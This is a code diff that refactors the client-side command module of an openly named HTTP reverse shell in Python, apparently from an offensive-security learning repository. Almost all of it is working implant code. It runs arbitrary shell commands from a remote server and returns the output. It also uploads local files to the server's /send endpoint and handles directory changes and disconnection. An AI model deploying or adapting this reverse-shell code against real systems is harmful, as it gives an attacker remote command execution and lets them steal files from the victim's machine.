@@ -1,50 +1,49 @@
+#!/usr/bin/env python3
+# https://github.com/EONRaider/BCA-Basic-HTTP-Reverse-Shell
+
+__author__ = "EONRaider @ keybase.io/eonraider"
+
 import http.client
 import os
 import subprocess
 from pathlib import Path
 from typing import Sequence
 
-client_commands = list()
 
+class ClientCommands:
+    def __init__(self, client):
+        self.client = client
 
-def client_command(func):
-    client_commands.append(func.__name__)
-    return func
+    def cd(self, dest_dir: [str, None]) -> None:
+        try:
+            dest_dir = "~" if dest_dir is None else dest_dir
+            os.chdir(Path(dest_dir).expanduser())
+        except FileNotFoundError as e:
+            self.client.send(f"{e}\n")
 
+    def upload(self, filename: str) -> None:
+        file_path = self.get_cwd().joinpath(filename)
+        if not Path(file_path).is_file():
+            self.client.send(f"{file_path}: No such file\n")
+        else:
+            with open(file=file_path, mode='rb') as fd:
+                self.client.send(data=fd.read(),
+                                 url=f"{self.client.server_url}/send")
 
-@client_command
-def cd(client, dest_dir: str) -> None:
-    try:
-        os.chdir(Path(dest_dir).expanduser())
-    except FileNotFoundError as e:
-        client.send(f"{e}\n")
+    def disconnect(self, *args, **kwargs):
+        connection = http.client.HTTPConnection(host=self.client.server_address,
+                                                port=self.client.server_port)
+        connection.request(method="GET",
+                           url=self.client.server_url,
+                           headers={"Connection": "close"})
+        raise SystemExit
 
+    def shell(self, command: [str, Sequence[str]]) -> None:
+        cmd = subprocess.run(command, capture_output=True, shell=True)
+        for result in cmd.stdout, cmd.stderr:
+            if len(result) > 0:
+                self.client.send(result)
 
-@client_command
-def upload(client, filename: str) -> None:
-    if not Path(filename).is_file():
-        client.send(f"{filename}: No such file")
-    else:
-        with open(file=filename, mode='rb') as fd:
-            client.send(fd.read(), url=f"{client.server_url}/send")
-
-
-@client_command
-def disconnect(client, *args, **kwargs):
-    connection = http.client.HTTPConnection(host=client.server_address,
-                                            port=client.server_port)
-    connection.request(method="GET",
-                       url=client.server_url,
-                       headers={"Connection": "close"})
-    raise SystemExit
-
-
-def shell(client, command: [str, Sequence[str]]) -> None:
-    cmd = subprocess.run(command, capture_output=True, shell=True)
-    for result in cmd.stdout, cmd.stderr:
-        if len(result) > 0:
-            client.send(result)
-
-
-def get_cwd() -> Path:
-    return Path.cwd()
+    @staticmethod
+    def get_cwd() -> Path:
+        return Path.cwd()
